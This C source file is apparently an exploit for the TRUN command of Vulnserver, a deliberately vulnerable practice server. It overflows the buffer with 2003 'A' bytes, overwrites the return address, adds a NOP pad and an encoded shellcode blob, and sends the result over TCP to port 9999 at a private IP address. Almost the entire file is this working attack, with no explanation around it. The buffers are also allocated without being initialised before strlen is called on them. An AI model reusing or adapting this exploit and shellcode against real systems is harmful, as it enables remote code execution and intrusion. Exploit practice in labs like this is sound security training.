#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#define PORT 9999
#define REALLOC_BUFFER_SIZE 4096

// Borrowed Snippet
// https://codereview.stackexchange.com/questions/83229/c-string-appender-for-buffers-and-strings
char *append(char *orig_str, size_t *orig_str_size, const char *append_str) {
    // no action required if appending an empty string
    if (append_str[0] == 0) {
        return orig_str;
    }

    // does the current char* have enough space?
    size_t req_space = strlen(orig_str) + strlen(append_str) + 1; // +1 for NULL byte

    // resize if the required space is greater than the original buffer size.
    if (req_space > *orig_str_size) {
        // prepare the variable with the amount of space we want
        size_t allocate = *orig_str_size + req_space + REALLOC_BUFFER_SIZE;

        char *new_str = (char *)realloc(orig_str, allocate);
        // resize success..
        if (new_str == NULL) {
            fprintf(stderr, "Couldn't reallocate memory\n");
            return NULL;
        }

        // the realloc didn't fail, here is our new pointer
        orig_str = new_str;

        // overwrite the free space with NULL's
        memset(orig_str + strlen(orig_str), 0, req_space);

        // copy the appending text to the string
        strcpy(orig_str + strlen(orig_str), append_str);

        // modify the original size
        *orig_str_size = allocate;

    } else {
        // append the string
        strcpy(orig_str + strlen(orig_str), append_str);
    }

    return orig_str;
}

int main() {
  int sock;
  int i;
  struct sockaddr_in vulnserver;
  char *trun = "TRUN /.:/";
  char *shellcode;
  char *bufA;
  char *bufPad;
  size_t buffer_size = 4096;
  size_t bufA_size = 2003;
  size_t bufPad_size = 32;
  shellcode = (char *)malloc(sizeof(char) * buffer_size);
  bufA = (char *)malloc(sizeof(char) * 2003);
  bufPad = (char *)malloc(sizeof(char) * 32);
  strcpy(shellcode, trun);
  char *memJmp = "\xaf\x11\x50\x62";
  char *overflow = "\xbd\x66\x42\x21\xe4\xda\xda\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\x0e\x4c\xc3\x11\x32\xb8\x81\xda\xca\x39\xe6\x53\x2f\x08\x26\x07\x24\x3b\x96\x43\x68\xb0\x5d\x01\x98\x43\x13\x8e\xaf\xe4\x9e\xe8\x9e\xf5\xb3\xc9\x81\x75\xce\x1d\x61\x47\x01\x50\x60\x80\x7c\x99\x30\x59\x0a\x0c\xa4\xee\x46\x8d\x4f\xbc\x47\x95\xac\x75\x69\xb4\x63\x0d\x30\x16\x82\xc2\x48\x1f\x9c\x07\x74\xe9\x17\xf3\x02\xe8\xf1\xcd\xeb\x47\x3c\xe2\x19\x99\x79\xc5\xc1\xec\x73\x35\x7f\xf7\x40\x47\x5b\x72\x52\xef\x28\x24\xbe\x11\xfc\xb3\x35\x1d\x49\xb7\x11\x02\x4c\x14\x2a\x3e\xc5\x9b\xfc\xb6\x9d\xbf\xd8\x93\x46\xa1\x79\x7e\x28\xde\x99\x21\x95\x7a\xd2\xcc\xc2\xf6\xb9\x98\x27\x3b\x41\x59\x20\x4c\x32\x6b\xef\xe6\xdc\xc7\x78\x21\x1b\x27\x53\x95\xb3\xd6\x5c\xe6\x9a\x1c\x08\xb6\xb4\xb5\x31\x5d\x44\x39\xe4\xf2\x14\x95\x57\xb3\xc4\x55\x08\x5b\x0e\x5a\x77\x7b\x31\xb0\x10\x16\xc8\x53\xb3\xf7\xd2\xa1\xa3\xf5\xd2\xb4\x6f\x73\x34\xdc\x9f\xd5\xef\x49\x39\x7c\x7b\xeb\xc6\xaa\x06\x2b\x4c\x59\xf7\xe2\xa5\x14\xeb\x93\x45\x63\x51\x35\x59\x59\xfd\xd9\xc8\x06\xfd\x94\xf0\x90\xaa\xf1\xc7\xe8\x3e\xec\x7e\x43\x5c\xed\xe7\xac\xe4\x2a\xd4\x33\xe5\xbf\x60\x10\xf5\x79\x68\x1c\xa1\xd5\x3f\xca\x1f\x90\xe9\xbc\xc9\x4a\x45\x17\x9d\x0b\xa5\xa8\xdb\x13\xe0\x5e\x03\xa5\x5d\x27\x3c\x0a\x0a\xaf\x45\x76\xaa\x50\x9c\x32\xca\xb2\x34\x4f\x63\x6b\xdd\xf2\xee\x8c\x08\x30\x17\x0f\xb8\xc9\xec\x0f\xc9\xcc\xa9\x97\x22\xbd\xa2\x7d\x44\x12\xc2\x57";

  for (i=0; i < 2003; ++i) {
    bufA = append(bufA, &bufA_size, "A");
  }
  for (i=0; i < 32; ++i) {
    bufPad = append(bufPad, &bufPad_size, "\x90");
  }

  strcat(shellcode, bufA);
  strcat(shellcode, memJmp);
  strcat(shellcode, bufPad);
  strcat(shellcode, overflow);


  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    printf("\n Socket creation error \n");
    return -1;
  }

  vulnserver.sin_family = AF_INET;
  vulnserver.sin_port = htons(PORT);

  if (inet_pton(AF_INET, "172.16.0.3", &vulnserver.sin_addr) <= 0)
  {
    printf("\nInvalid address / Address type not supported \n");

    return -1;
  }
  if (connect(sock, (struct sockaddr *)&vulnserver, sizeof(vulnserver)) < 0)
  {
    printf("\nConnection Failed\n");
    return -1;
  }
  send(sock, shellcode, strlen(shellcode), 0);
  close(sock);

  return 0;
}
